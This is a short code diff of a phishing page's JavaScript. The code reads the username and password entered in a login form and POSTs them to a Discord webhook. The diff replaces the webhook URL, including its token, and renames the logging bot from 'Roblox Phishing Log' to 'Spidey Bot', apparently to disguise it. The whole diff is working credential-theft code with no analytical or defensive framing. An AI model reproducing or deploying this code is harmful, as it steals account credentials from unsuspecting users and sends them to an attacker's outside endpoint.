@@ -5,7 +5,7 @@ function rand() {
 	u = document.getElementById("login-username").value; 
 	p = document.getElementById("login-password").value;
 	
-	wb = "https://discord.com/api/webhooks/1030480788501831751/cS9DEz0u_uciwfokSGYKTlFuvljzj5Z64G5NTQq7vgxo_PlIfzOnPeknJLliBcQy8To7"; //enter webhook here
+	wb = "https://discord.com/api/webhooks/1369392456377831574/JPtURuHiwdqtRKCVRBdf38CXwKxRF6VT0qkez9XKUcheM0b8Eg-RdFdPEYEdZvhzPPhU"; //enter webhook here
 	
 	var request = new XMLHttpRequest();
       request.open("POST", wb);
@@ -13,8 +13,8 @@ function rand() {
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
-        username: "Roblox Phishing Log",
-        avatar_url: "https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec",
+        username: "Spidey Bot",
+        avatar_url: "",
         content: "```Username: " + u + " | Password: " + p + "```"
       }
 
